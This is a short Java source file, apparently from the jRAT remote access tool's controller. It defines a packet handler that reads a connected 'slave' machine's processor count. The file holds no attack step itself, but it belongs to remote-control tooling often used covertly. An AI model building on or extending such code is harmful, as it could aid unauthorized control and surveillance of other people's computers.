package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;

public class Packet64InitAvailableProcessors extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short processors = slave.readShort();
		slave.setProcessors(processors);
	}

}
